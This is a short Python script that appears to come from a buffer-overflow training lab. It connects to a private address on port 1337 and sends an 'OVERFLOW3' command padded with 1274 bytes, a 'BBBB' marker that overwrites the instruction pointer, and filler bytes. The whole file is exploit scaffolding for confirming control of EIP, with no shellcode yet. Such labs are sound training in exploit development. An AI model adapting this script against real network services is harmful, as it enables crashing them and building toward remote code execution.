#!/usr/bin/env python3

import socket

host, port = "10.10.191.46", 1337

command = b"OVERFLOW3 "
length = 2000
offset = 1274
new_eip = b"BBBB"

payload = b"".join([
	command,
	b"A" * offset,
	new_eip,
	b"C" * ( length - len(new_eip) - offset),
])

with socket.socket() as s:
	s.connect((host, port))
	# banner = s.recv(4096).decode("utf-8").strip()
	s.send(payload)